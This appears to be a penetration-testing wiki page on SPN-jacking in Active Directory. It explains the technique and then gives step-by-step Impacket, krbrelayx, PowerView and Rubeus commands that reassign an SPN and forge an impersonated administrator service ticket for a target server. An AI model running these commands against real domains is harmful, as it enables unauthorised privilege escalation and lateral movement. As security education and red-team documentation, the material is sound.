# SPN-jacking

## Theory

This attack combines [Kerberos Constrained delegation abuse](delegations/constrained.md) and [DACL abuse](../dacl/). A service configured for Kerberos Constrained Delegation (KCD) can impersonate users on a set of services. The "set of services" is specified in the constrained delegation configuration. It is a list of SPNs (Service Principal Names) written in the `msDS-AllowedToDelegateTo` attribute of the KCD service's object.

In standard KCD abuse scenarios, an attacker that gains control over a "KCD service" can operate lateral movement and obtain access to the other services/SPNs. Since KCD allows for impersonation, the attacker can also impersonate users (e.g. domain admins) on the target services. Depending on the SPNs, or if it's possible to [modify it](ptt.md#modifying-the-spn), the attacker could also gain admin access to the server the "listed SPN" belongs to.

On top of all that, if attacker is able to move a "listed SPN" from the original object to the another one, he could be able to compromise it. This is called SPN-jacking and it was intially discovered and explaine by [Elad Shamir](https://twitter.com/elad\_shamir) in [this post](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/).

1. In order to "move the SPN", the attacker must have the right to edit the target object's `ServicePrincipalName` attribute (i.e. `GenericAll`, `GenericWrite` over the object or`WriteProperty` over the attribute (called `WriteSPN` [since BloodHound 4.1](https://posts.specterops.io/introducing-bloodhound-4-1-the-three-headed-hound-be3c4a808146)), etc.).
2. If the "listed SPN" already belongs to an object, it must be removed from it first. This would require the same privileges (`GenericAll`, `GenericWrite`, etc.) over the SPN owner as well (_a.k.a. "Live SPN-jacking"_). Else, the SPN can be simply be added to the target object (_a.k.a. "Ghost SPN-jacking"_).

## Practice

{% hint style="info" %}
In this scenario, we assume the Kerberos Constrained Delegation is configured [with protocol transition](delegations/constrained.md#with-protocol-transition) in order to keep things simple. However, the SPN-jacking attack can be conducted on [KCD without protocol transition](delegations/constrained.md#without-protocol-transition) as well (cf. [RBCD technique](delegations/constrained.md#rbcd-approach)).

In this scenario (following [Elad](https://twitter.com/elad\_shamir)'s [post](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)):

* serverA is configured for KCD
* serverB's SPN is listed in serverA's KCD configuration
* serverC is the final target
* attacker controls serverA, has at least WriteSPN over serverB (if needed, "live SPN-jacking"), and at least WriteSPN over serverC.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like machines, [krbrelayx](https://github.com/dirkjanm/krbrelayx)'s [addspn.py](https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py) and [Impacket](https://github.com/SecureAuthCorp/impacket) example scripts (Python) can be used to conduct the different steps (manipulate SPNs, obtain and manipulate tickets).

_At the time of writing, 12th Feb. 2022,_ [_the pull request_](https://github.com/SecureAuthCorp/impacket/pull/1256) _adding the `tgssub.py` is pending._ [_The pull request_](https://github.com/SecureAuthCorp/impacket/pull/1184) _modifying the `findDelegation.py` is pending._

:warning: _At the time of writing, 12th Feb. 2022, this technique has not been fully fool-proofed from UNIX systems. In case something errors, switch to the Windows technique._

```python
# 1. show SPNs listed in the KCD configuration
findDelegation.py -user 'serverA$' "DOMAIN"/"USER":"PASSWORD"

# 2. remove SPN from ServerB if required (live SPN-jacking)
addspn.py --clear -t 'ServerB$' -u 'domain\user' -p 'password' 'DomainController.domain.local'

# 3. add SPN to serverC
addspn.py -t 'ServerC$' --spn "cifs/serverB" -u 'domain\user' -p 'password' -c 'DomainController.domain.local'

# 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
getST -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:password'

# 5. Edit the ticket's SPN (service class and/or hostname)
tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/serverC"
```

Once the final service ticket is obtained, it can be used with [Pass the Cache](ptc.md) / [Pass the Ticket](ptt.md) to access the target.
{% endtab %}

{% tab title="Windows" %}
From Windows machines, [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) (PowerShell) and  [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to conduct the different steps (manipulate SPNs, obtain and manipulate tickets).



```powershell
# 1. show SPNs listed in the KCD configuration
Get-DomainObject -Identity ServerA$ -Properties 'msDS-AllowedToDelegateTo'

# 2. remove SPN from ServerB if required (live SPN-jacking)
Set-DomainObject -Identity ServerB$ -Clear 'ServicePrincipalName'

# 3. add SPN to serverC
Set-DomainObject -Identity ServerC$ -Set @{ServicePrincipalName='cifS/serverB'}

# 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
Rubeus.exe s4u /nowrap /msdsspn:"cifs/serverB" /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"

# 5. Edit the ticket's SPN (service class and/or hostname)
Rubeus.exe tgssub /nowrap /altservice:"host/serverC" /ticket:"ba64ticket"
```

Once the final service ticket is obtained, it can be used with [Pass the Ticket](ptt.md) to access the target.
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse" %}
